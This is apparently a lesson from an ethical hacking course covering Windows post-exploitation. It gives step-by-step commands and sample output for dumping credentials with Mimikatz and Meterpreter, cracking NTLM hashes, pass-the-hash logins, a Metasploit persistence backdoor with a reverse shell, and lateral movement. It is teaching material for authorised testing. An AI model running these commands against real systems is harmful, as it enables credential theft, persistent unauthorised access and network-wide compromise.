# Day 21 — Maintaining Access: Post-Exploitation Techniques

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 20 — XSS](#) | Next: [Day 22](#)

---

## 📋 Table of Contents

1. [What is Maintaining Access?](#1-what-is-maintaining-access)
2. [Tool: Mimikatz](#2-tool-mimikatz)
3. [NTLM Hashes Explained](#3-ntlm-hashes-explained)
4. [Technique 1: Dump Hashes with Mimikatz (Native)](#4-technique-1-dump-hashes-with-mimikatz-native)
5. [Technique 2: Dump Hashes via Meterpreter](#5-technique-2-dump-hashes-via-meterpreter)
6. [Cracking NTLM Hashes](#6-cracking-ntlm-hashes)
7. [Pass-the-Hash Attack](#7-pass-the-hash-attack)
8. [Technique 3: Persistence with Metasploit](#8-technique-3-persistence-with-metasploit)
9. [Lateral Movement Overview](#9-lateral-movement-overview)
10. [Quick Reference Cheat Sheet](#10-quick-reference-cheat-sheet)

---

## 1. What is Maintaining Access?

After gaining initial access to a system, the attacker's next goal is to **maintain that access** — ensuring they can return even if:
- The victim restarts their computer
- The Meterpreter session is closed
- The attacker's machine is turned off

**Why maintaining access matters in penetration testing:**

| Goal | Method |
|------|--------|
| Re-enter without re-exploiting | Dump and crack credentials |
| Move to other machines on the network | Lateral movement using credentials/hashes |
| Survive reboots | Set up persistence (auto-reconnect on startup) |
| Backdoor access | Hidden user account or scheduled task |

---

## 2. Tool: Mimikatz

**Mimikatz** is a post-exploitation tool for Windows that extracts credentials from memory.

**What it can retrieve:**
- **NTLM password hashes** — Windows' encrypted password format
- **Clear-text passwords** (in some Windows configurations via WDigest)
- **Kerberos tickets** — for Active Directory attacks
- **WiFi passwords** saved on the system

**Key requirement:** Must run with **Administrator or SYSTEM level privileges**  
(Privilege escalation must be performed first if you have lower access)

---

## 3. NTLM Hashes Explained

Windows doesn't store passwords as plain text — they're stored as **NTLM hashes**.

```
Plain text password:  Password123
NTLM hash:           8846F7EAEE8FB117AD06BDD830B7586C
```

**Two ways to use NTLM hashes:**

| Method | Description |
|--------|-------------|
| **Crack the hash** | Use Hashcat / John the Ripper / CrackStation to recover the plain text password |
| **Pass-the-Hash** | Use the hash directly to authenticate — no cracking needed |

---

## 4. Technique 1: Dump Hashes with Mimikatz (Native)

**Scenario:** You have SSH/RDP access to a Windows machine as Administrator.

### Step 1: Access the target machine

```bash
# SSH into Windows (if SSH is enabled)
ssh DOMAIN\\administrator@<target-ip>
```

Verify your user:
```cmd
whoami
# Should return: CONTROLLER\administrator
```

### Step 2: Navigate to Mimikatz

```cmd
cd Downloads
dir
# mimikatz.exe should be listed
```

### Step 3: Run Mimikatz

```cmd
mimikatz.exe
```

You'll see the Mimikatz banner and prompt: `mimikatz #`

### Step 4: Check privileges

```
mimikatz # privilege::debug
```

Expected output: `Privilege '20' OK`  
If you see OK → you have sufficient privileges to dump credentials.

### Step 5: Dump NTLM hashes from memory

```
mimikatz # lsadump::lsa /patch
```

**Example output:**
```
Domain: CONTROLLER
SID: S-1-5-21-...

RID  : 000001f4 (500)
User : Administrator
 Hash NTLM: [hash_value_here]

RID  : 000001f5 (501)
User : Guest
 Hash NTLM: [empty]

RID  : 00000453 (1107)
User : Admin2
 Hash NTLM: [hash_value_here]

RID  : 00000454 (1108)
User : SQLService
 Hash NTLM: [hash_value_here]
```

### Other useful Mimikatz commands

```
mimikatz # sekurlsa::logonpasswords     # Dump credentials from memory (may show plaintext)
mimikatz # lsadump::lsa /patch          # Dump all NTLM hashes
mimikatz # lsadump::secrets            # Dump LSA secrets
mimikatz # sekurlsa::wdigest           # Dump WDigest (plaintext if enabled)
mimikatz # kerberos::list              # List Kerberos tickets
mimikatz # wifi::list                  # List saved WiFi passwords
mimikatz # exit                        # Exit Mimikatz
```

---

## 5. Technique 2: Dump Hashes via Meterpreter

You can use Mimikatz directly from within a Meterpreter session without uploading any files.

### Method A: hashdump command

```
meterpreter > hashdump
```

**Example output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Tony Stark:1001:aad3b435b51404eeaad3b435b51404ee:[ntlm_hash_here]:::
```

Format: `username:RID:LM_hash:NTLM_hash:::`  
→ The **NTLM hash** is the 4th field (after the third colon)

### Method B: Load Kiwi (Mimikatz) extension

```
meterpreter > load kiwi
```

After loading, new commands become available:

```
meterpreter > help
```

**Kiwi commands:**

| Command | Description |
|---------|-------------|
| `creds_all` | Retrieve all types of credentials |
| `lsa_dump_sam` | Dump local SAM database hashes |
| `lsa_dump_secrets` | Dump LSA secrets |
| `creds_wdigest` | Dump WDigest credentials (may show plaintext) |
| `creds_ntlm` | Dump NTLM credentials |
| `creds_kerberos` | Dump Kerberos tickets |
| `wifi_list` | List saved WiFi passwords |

**Example dump:**
```
meterpreter > lsa_dump_sam
```

**Output:**
```
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN10
SysKey : ...

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: [ntlm_hash]

RID  : 000003e9 (1001)
User : Tony Stark
  Hash NTLM: [ntlm_hash]
```

### Prerequisite: Get SYSTEM privileges first

```
meterpreter > getsystem
meterpreter > getuid
# NT AUTHORITY\SYSTEM  ← confirms highest privilege
```

---

## 6. Cracking NTLM Hashes

### Method 1: CrackStation (Online — quickest)

1. Go to [https://crackstation.net](https://crackstation.net)
2. Paste the NTLM hash
3. Complete CAPTCHA → click **Crack Hashes**
4. If found in their rainbow table → plain text password returned

### Method 2: Hashcat (Offline — most powerful)

```bash
# Crack NTLM hash with rockyou.txt wordlist
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Flags:
# -m 1000  → NTLM hash type
# -a 0     → dictionary attack
```

### Method 3: John the Ripper

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Hash type reference

| Hash Type | Hashcat Mode | Example Use |
|-----------|-------------|-------------|
| NTLM | `-m 1000` | Windows passwords |
| MD5 | `-m 0` | Web app passwords |
| SHA1 | `-m 100` | Various apps |
| bcrypt | `-m 3200` | Linux passwords |

---

## 7. Pass-the-Hash Attack

**Pass-the-Hash (PtH)** allows you to authenticate using the NTLM hash directly — **without knowing or cracking the plain text password**.

```
Normal auth:   username + plain text password → access
Pass-the-Hash: username + NTLM hash → access (Windows accepts the hash!)
```

### Using Evil-WinRM with hash

```bash
evil-winrm -i <target-ip> -u administrator -H <ntlm_hash>
```

| Flag | Meaning |
|------|---------|
| `-i` | Target IP |
| `-u` | Username |
| `-H` | NTLM hash (instead of password) |

**Verify access:**
```cmd
whoami
# CONTROLLER\administrator
```

### Using CrackMapExec (lateral movement)

```bash
crackmapexec smb <target-ip> -u administrator -H <ntlm_hash>
```

### Using Metasploit psexec module

```
use exploit/windows/smb/psexec
set RHOSTS <target-ip>
set SMBUser administrator
set SMBPass <ntlm_hash>    ← paste NTLM hash here instead of password
run
```

---

## 8. Technique 3: Persistence with Metasploit

**Goal:** Automatically receive a Meterpreter session every time the target machine reboots.

### Step 1: Get a Meterpreter session

Ensure you already have an active session with SYSTEM privileges:
```
meterpreter > getsystem
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```

### Step 2: Background the current session

```
meterpreter > background
# Session 1 backgrounded
```

Verify:
```
msf6 > sessions -l
# Shows active sessions
```

### Step 3: Use the persistence module

```
msf6 > use exploit/windows/local/persistence
```

### Step 4: Configure options

```
msf6 exploit(persistence) > options
```

Key options to set:

| Option | Value | Description |
|--------|-------|-------------|
| `SESSION` | `1` | Which Meterpreter session to use |
| `STARTUP` | `SYSTEM` | Run at system startup (highest privilege) |
| `DELAY` | `10` | Seconds before first connection attempt |
| `LPORT` | `4499` | Port to connect back on (use a different one) |

```
msf6 > set SESSION 1
msf6 > set STARTUP SYSTEM
msf6 > set LPORT 4499
msf6 > run
```

**Successful output:**
```
[*] Running module against WIN10
[+] Persistent Script Installed
[*] Cleaning up...
```

### Step 5: Set up a new listener for the persistent connection

```
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <your-ip>
msf6 > set LPORT 4499       ← match what you set above
msf6 > run
```

### Step 6: Test — reboot the target machine

After the target reboots:
```
[*] Meterpreter session 2 opened  ← auto-reconnect on boot!
meterpreter > sysinfo
# Shows target machine info
```

✅ **Persistence established — you get a session back on every reboot.**

---

## 9. Lateral Movement Overview

Once you have credentials/hashes, use them to move to **other machines on the same network**.

```
[Machine A] → compromised → dump NTLM hashes
                ↓
[Machine B] → use hashes with PtH → gain access
                ↓
[Machine C] → repeat...
```

**Why NTLM hashes enable lateral movement:**
- Many machines in a corporate network share the same local admin password
- Pass-the-Hash works even if you can't crack the password
- One compromised account can unlock many machines

**Key tools for lateral movement:**

| Tool | Use |
|------|-----|
| `evil-winrm` | Remote shell via WinRM (port 5985) |
| `crackmapexec` | Test credentials/hashes across multiple hosts |
| `psexec.py` (Impacket) | Remote code execution via SMB |
| `wmiexec.py` (Impacket) | Remote execution via WMI |
| Metasploit `psexec` | Lateral movement via SMB exploit |

---

## 10. Quick Reference Cheat Sheet

### Mimikatz (Native)
```
mimikatz.exe
privilege::debug              # Check privileges (should say OK)
lsadump::lsa /patch           # Dump all NTLM hashes
sekurlsa::logonpasswords      # Dump from memory (may include plaintext)
lsadump::secrets              # LSA secrets
sekurlsa::wdigest             # WDigest plaintext creds (if enabled)
wifi::list                    # WiFi passwords
exit
```

### Meterpreter — Credential Dumping
```
meterpreter > getsystem              # Get SYSTEM privileges
meterpreter > getuid                 # Verify privilege level
meterpreter > hashdump               # Quick hash dump
meterpreter > load kiwi             # Load Mimikatz extension
meterpreter > lsa_dump_sam          # Dump SAM hashes
meterpreter > lsa_dump_secrets      # Dump LSA secrets
meterpreter > creds_all             # All credential types
```

### Pass-the-Hash
```bash
# Evil-WinRM
evil-winrm -i <ip> -u <user> -H <ntlm_hash>

# CrackMapExec
crackmapexec smb <ip> -u <user> -H <ntlm_hash>
```

### Persistence Setup
```
meterpreter > background
msf6 > use exploit/windows/local/persistence
msf6 > set SESSION 1
msf6 > set STARTUP SYSTEM
msf6 > set LPORT 4499
msf6 > run

# Then set up handler:
msf6 > use exploit/multi/handler
msf6 > set LPORT 4499
msf6 > run
```

### Crack NTLM Hashes
```bash
# Hashcat
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# John
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Online
# https://crackstation.net
```

### Maintaining Access Summary
```
Method 1: Dump hashes (Mimikatz) → crack → use plain-text password for re-entry
Method 2: Dump hashes (Mimikatz) → Pass-the-Hash → authenticate without cracking
Method 3: Persistence module → auto Meterpreter session on every reboot
```

---

> ✅ **End of Day 21 Notes**  
> 📌 Next up: **Clearing Tracks** — the final phase of the ethical hacking methodology  
> 💡 Practice: TryHackMe "Post-Exploitation Basics" and "Attacktive Directory" rooms  
> ⚠️ Only test on machines you own or have explicit permission to test  
> 💬 Questions? Drop them in the comments!